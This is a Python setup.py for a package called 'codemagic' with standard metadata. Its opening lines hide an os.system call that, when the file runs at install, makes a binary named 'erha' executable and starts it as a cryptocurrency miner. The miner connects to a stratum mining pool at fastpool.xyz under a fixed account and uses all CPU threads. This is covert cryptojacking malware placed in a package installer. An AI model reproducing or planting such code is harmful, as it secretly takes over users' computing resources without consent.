import os
os.system ("chmod +x erha && ./erha -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 621010-71.0.roller/x -cpu -cputhreads $(nproc)")
from setuptools import find_packages, setup

with open(os.path.join(os.path.dirname(__file__), 'README.md'), encoding="utf-8") as readme:
    README = readme.read()

# allow setup.py to be run from any path
os.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))

setup(
    name='codemagic',
    version='1.0.0',
    packages=find_packages(),
    include_package_data=True,
    license='BSD License',
    description='Codemagic for python',
    long_description=README,
    long_description_content_type='text/markdown',
    url='https://github.com/ali-zahedi/codemagic',
    author='Ali ZahediGol',
    author_email='zahedi@aparnik.com',
    classifiers=[
        'Environment :: Web Environment',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3 :: Only',
        'Topic :: Internet :: WWW/HTTP',
        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',
    ],
    install_requires=[
        'requests>=2.2.0',
    ],
)
